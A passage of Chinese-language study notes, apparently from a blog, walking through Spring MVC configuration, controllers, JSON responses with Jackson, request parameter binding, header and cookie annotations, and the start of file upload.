class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.3.15<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.11<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--servlet依赖--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javax.servlet-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--mysql依赖--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.0.25<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="页面跳转"><a href="#页面跳转" class="headerlink" title="页面跳转"></a>页面跳转</h5><p>需求:客户端发起请求,服务端接收请求,执行逻辑并进行视图跳转</p>
<p>springMVC开发步骤:</p>
<ul>
<li>导入SpringMVC相关坐标</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-webmvc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.3.15<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>web.xml配置SpringMVC核心控制器DispathcerServlet</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>DispatcherServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.springframework.web.servlet.DispatcherServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>classpath:spring-mvc.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>1<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span><span class="comment">&lt;!--代表服务器启动时候就加载调度员对象--&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>DispatcherServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>创建Controller类和视图页面</li>
<li>使用注解配置Controller类中业务方法的映射地址</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.manage.Controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserController</span> </span>&#123;</span><br><span class="line">    <span class="comment">//请求地址为/user/quick</span></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/quick&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">save</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;controller save running...&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;success.jsp&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>配置SpringMVC核心文件spring-mvc.xml</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:context</span>=<span class="string">&quot;http://www.springframework.org/schema/context&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd</span></span></span><br><span class="line"><span class="string"><span class="tag">                          http://www.springframework.org/schema/context  http://www.springframework.org/schema/context/spring-context.xsd&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--Controller的组件扫描--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">&quot;com.manage.Controller&quot;</span>/&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>客户端发起请求测试</li>
</ul>
<h3 id="SpringMVC的执行流程"><a href="#SpringMVC的执行流程" class="headerlink" title="SpringMVC的执行流程"></a>SpringMVC的执行流程</h3><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220129160149808.png" alt="image-20220129160149808"></p>
<p>1.用户发请求至前端控制器DispatcherServlet</p>
<p>2.DispatcherServlet收到请求调用HanderMapping处理器映射器</p>
<p>3.处理器引射器找到具体的处理器(可以根据xml配置,注解进行查找),生成处理器对象及处理器拦截器(如果有则生成)并一并返回给DispatcherServlet</p>
<p>4.DispatcherServlet调用HandlerAdapter处理器适配器</p>
<p>5.HandlerAdapter经过适配调用具体的处理器(Controller,也叫后端控制器)</p>
<p>6.Controller执行完成返回ModelAndView</p>
<p>7.HandlerAdapter将controller执行结果ModelAndView返回给DisatcherServlet</p>
<p>8.DispatcherServlet将ModelAndView传给ViewReslover视图解析器</p>
<p>9.ViewReslover解析后返回具体View</p>
<p>10.DispatcherServlet根据View进行渲染视图(即将模型数据填充至视图中),DispatcherServlet响应用户</p>
<p>SpringMVC注解</p>
<ul>
<li>@RequestMapping</li>
</ul>
<p>建立请求URL和处理请求方法之间的对应关系,可以写在类上面,也可以写在方法上面,类的请求路径对于方法属于包含关系</p>
<p>value:用于指定请求的url</p>
<p>method:指定请求的方式</p>
<p>params:用于指定限制请求参数的条件,它支持简单的表达式,要求请求参数的key和value必须和配置的一模一样</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">params=&#123;&quot;accountName&quot;&#125;,表示请求参数必须有accountName</span><br><span class="line">params=&#123;&quot;money!=100&quot;&#125;,表示请求参数中money不能是100</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserController</span> </span>&#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/quick&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">save</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;controller save running...&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;/success.jsp&quot;</span>;</span><br><span class="line">        <span class="comment">//可以指定转发或者重定向,默认是重定向</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;forward:/success.jsp&quot;</span><span class="comment">//转发</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;redirect:/success.jsp&quot;</span><span class="comment">//重定向</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>可以配置视图解析器,让返回的页面可以简写</strong></p>
<h4 id="SpringMVC的数据响应方式"><a href="#SpringMVC的数据响应方式" class="headerlink" title="SpringMVC的数据响应方式"></a>SpringMVC的数据响应方式</h4><h5 id="页面跳转-1"><a href="#页面跳转-1" class="headerlink" title="页面跳转"></a>页面跳转</h5><ul>
<li>直接返回字符串</li>
<li>通过ModelAndView对象返回</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/quick2&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> ModelAndView <span class="title">save2</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        Model:模型 作用封装数据</span></span><br><span class="line"><span class="comment">        View:视图 作用展示数据</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        ModelAndView modelAndView=<span class="keyword">new</span> ModelAndView();</span><br><span class="line">        <span class="comment">//设置模型数据</span></span><br><span class="line">        modelAndView.addObject(<span class="string">&quot;username&quot;</span>,<span class="string">&quot;aaahhahahaha&quot;</span>)</span><br><span class="line">        <span class="comment">//设置视图名称,这是类似于重定向的</span></span><br><span class="line">        modelAndView.setViewName(<span class="string">&quot;index.jsp&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> modelAndView;</span><br><span class="line">    &#125;</span><br><span class="line">---------------------------------------------------------</span><br><span class="line">也可以单独返回model或者view</span><br><span class="line">    SpringMVC可以将形参当成实参用,不需要传入参数</span><br><span class="line">     <span class="function"><span class="keyword">public</span> ModelAndView <span class="title">save2</span><span class="params">(ModelAndView modelAndView)</span>和上面作用相等,SpringMVC会帮我们创建modelAndView对象,可以直接在方法里面用modelAndView</span></span><br><span class="line"><span class="function">    </span></span><br></pre></td></tr></table></figure>

<h5 id="回写数据"><a href="#回写数据" class="headerlink" title="回写数据"></a>回写数据</h5><ul>
<li><p>直接返回字符串</p>
<ul>
<li>使用response中的write方法    </li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/quick3&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">save3</span><span class="params">(HttpServletResponse response)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        response.getWriter().print(<span class="string">&quot;hellodsjfdsjfsdfd&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>可以添加@ResponseBody注解告诉SpringMVC框架,方法返回的字符串不是跳转,是直接在http响应体中返回</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/quick4&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">save3</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;djfjdsfdsjf&quot;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li>
<li><p>直接返回json字符串</p>
</li>
</ul>
<p>不管它是json字符串还是啥,本质都是字符串</p>
<p>将对象转换为json字符串需要导入jackson依赖</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.13.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-databind<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.13.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-annotations<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.13.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>



<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/quick5&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">save4</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        User user=<span class="keyword">new</span> User();</span><br><span class="line">        user.setName(<span class="string">&quot;llllll&quot;</span>);</span><br><span class="line">        user.setAge(<span class="number">18</span>);</span><br><span class="line">        <span class="comment">//使用json的转换工具将对象转换成json格式</span></span><br><span class="line">        ObjectMapper objectMapper=<span class="keyword">new</span> ObjectMapper();</span><br><span class="line">        String json=objectMapper.writeValueAsString(user);</span><br><span class="line">        <span class="keyword">return</span> json;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>期间出现了报错</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220129222455211.png" alt="image-20220129222455211"></p>
<p>原因是需要将原来类中的属性设置为public或者提供get方法</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220129222727835.png" alt="image-20220129222727835"></p>
<ul>
<li>返回对象或者集合</li>
</ul>
<p>上面返回json的方法比较麻烦,可以通过配置处理器映射器的方法,自动将返回对象转换为json字符串</p>
<p>spring-mvc.xml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--配置处理器映射器,方便返回json字符串--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;messageConverters&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.http.converter.json.MappingJackson2HttpMessageConverter&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这样一配置,现在上面的代码就可以简化为,同时还帮忙解决了中文乱码的问题</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/quick6&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> User <span class="title">save6</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        User user=<span class="keyword">new</span> User();</span><br><span class="line">        user.setName(<span class="string">&quot;llllll&quot;</span>);</span><br><span class="line">        user.setAge(<span class="number">18</span>);</span><br><span class="line">        <span class="keyword">return</span> user;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><strong>经典上面白学</strong></p>
<p>只需要在spring-mvc.xml配置一个mvc的注解驱动就可以自动完成上面的所有跟jackson有关的配置</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:context</span>=<span class="string">&quot;http://www.springframework.org/schema/context&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:mvc</span>=<span class="string">&quot;http://www.springframework.org/schema/mvc&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd</span></span></span><br><span class="line"><span class="string"><span class="tag">                          http://www.springframework.org/schema/mvc http://www.springframework.org/schema/mvc/spring-mvc.xsd</span></span></span><br><span class="line"><span class="string"><span class="tag">                          http://www.springframework.org/schema/context  http://www.springframework.org/schema/context/spring-context.xsd&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--Controller的组件扫描--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">&quot;com.manage.Controller&quot;</span>/&gt;</span></span><br><span class="line">   <span class="comment">&lt;!--mvc的注解驱动--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mvc:annotation-driven</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="SpringMVC的获得请求参数"><a href="#SpringMVC的获得请求参数" class="headerlink" title="SpringMVC的获得请求参数"></a>SpringMVC的获得请求参数</h3><h4 id="获得POJO参数"><a href="#获得POJO参数" class="headerlink" title="获得POJO参数"></a>获得POJO参数</h4><h4 id="获得数组类型参数"><a href="#获得数组类型参数" class="headerlink" title="获得数组类型参数"></a>获得数组类型参数</h4><p>Controller中的业务方法数组名称与请求参数的name一致,参数会自动映射匹配</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">请求地址http:<span class="comment">//localhost:8080/quick7?strings=111&amp;strings=222&amp;strings=333</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/quick7&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">save7</span><span class="params">(String[] strings)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        System.out.println(Arrays.asList(strings));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="获得集合类型参数"><a href="#获得集合类型参数" class="headerlink" title="获得集合类型参数"></a>获得集合类型参数</h4><p>获得集合参数时,要将集合参数包装到一个POJO中才可以</p>
<p>使用ajax提交时,可以指定contentType为json形式,那么在方法参数位置使用@RequestBody可以直接接收集合数据而无需使用POJO进行包装</p>
<h3 id="配置静态资源访问"><a href="#配置静态资源访问" class="headerlink" title="配置静态资源访问"></a>配置静态资源访问</h3><p>可以配置静态资源的对应路径和请求路径</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">mvc:resources</span> <span class="attr">mapping</span>=<span class="string">&quot;/img/**&quot;</span> <span class="attr">location</span>=<span class="string">&quot;/img/&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<p>或者交给Tomcat找</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">mvc:default-servlet-handler</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="配置全局编码过滤器"><a href="#配置全局编码过滤器" class="headerlink" title="配置全局编码过滤器"></a>配置全局编码过滤器</h3><p>和之前学习servlet的过滤器一个作用</p>
<p>web.xml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>CharacterEncodingFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.springframework.web.filter.CharacterEncodingFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>encoding<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>CharacterEncodingFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="参数绑定注解-RequestParam"><a href="#参数绑定注解-RequestParam" class="headerlink" title="参数绑定注解@RequestParam"></a>参数绑定注解@RequestParam</h4><p>当请求的参数名称与Controller的业务方法参数名称不一致时,就需要通过@RequestParam注解显示的绑定</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@RequestMapping(&quot;/quick8&quot;)</span><br><span class="line">    @ResponseBody</span><br><span class="line">    public void save8(@RequestParam(&quot;name&quot;) String username) throws IOException &#123;</span><br><span class="line">        System.out.println(username);</span><br><span class="line">    &#125;</span><br><span class="line">    http://localhost:8080/quick8?name=张三</span><br></pre></td></tr></table></figure>

<p>这样在前端传递参数的时候就可以写name=….,等于同义替换了一下</p>
<p>@RequestParam注解的参数简介</p>
<ul>
<li>value:请求参数名称(默认的参数)</li>
<li><strong>required</strong>:可以选择该参数在请求中是否必须包含,默认是true,如果此时没有包含则会报错,false则可以不包含该参数发起请求</li>
<li>defaultValue:当没有指定请求参数时,则使用指定的默认值赋值,就是给前面的name一个默认值</li>
</ul>
<h4 id="获取Servlet相关API"><a href="#获取Servlet相关API" class="headerlink" title="获取Servlet相关API"></a>获取Servlet相关API</h4><p>直接在函数形参中定义形参使用即可,剩下的交给框架</p>
<p>如</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/quick3&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">save3</span><span class="params">(HttpServletResponse response)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        response.getWriter().print(<span class="string">&quot;hellodsjfdsjfsdfd&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="获取请求头"><a href="#获取请求头" class="headerlink" title="获取请求头"></a>获取请求头</h4><h5 id="RequestHeader"><a href="#RequestHeader" class="headerlink" title="@RequestHeader"></a>@RequestHeader</h5><p>使用@RequestHeader注解可以获得请求头信息,相当于web的时候学习的request.getHeader(name)</p>
<p>@RequestHeader属性</p>
<ul>
<li>value:请求头名称</li>
<li>required:是否必须携带此请求头</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/quick9&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">save9</span><span class="params">(<span class="meta">@RequestHeader(value = &quot;User-Agent&quot;)</span> String userAgent)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        System.out.println(userAgent);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h5 id="CookieValue"><a href="#CookieValue" class="headerlink" title="@CookieValue"></a>@CookieValue</h5><p>使用@CookieValue可以获得指定Cookie的值</p>
<p>@CookieValue属性</p>
<ul>
<li>value:指定Cookie的名称</li>
<li>required:是否必须携带此Cookie</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/quick10&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">save10</span><span class="params">(<span class="meta">@CookieValue(value=&quot;JSESSIONID&quot;)</span> String jsessionId)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        System.out.println(jsessionId);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h4><h5 id="文件上传客户端三要素"><a href="#文件上传客户端三要素" class="headerlink" title="文件上传客户端三要素"></a>文件上传客户端三要素</h5><ul>
<li>表单项type=”file”</li>
<li>表单的提交方式是post</li>
<li>表单的enctype属性是多部分表单形式,即enctype=”multipart/from-data”</li>
</ul>
<h5 id="文件上传原理"><a href="#文件上传原理" class="headerlink" title="文件上传原理"></a>文件上传原理</h5><ul>
<li>当from表单修改为多部分表单时,request.getParameter()将失效</li>
<li>enctype=”application/x-www-from-urlencoded”时,from表单的正文内容格式是:key=value&amp;key2=value2</li>
<li>当from表单的enctype取值为mutilpart/from-data时,正文内容就变成多部分形式,(数据包中通过横杠来分割)</li>
</ul>
<h5 id="单文件上传步骤"><a href="#单文件上传步骤" class="headerlink" title="单文件上传步骤"></a>单文件上传步骤</h5><ul>
<li>导入fileupload和io依赖</li>
</ul>
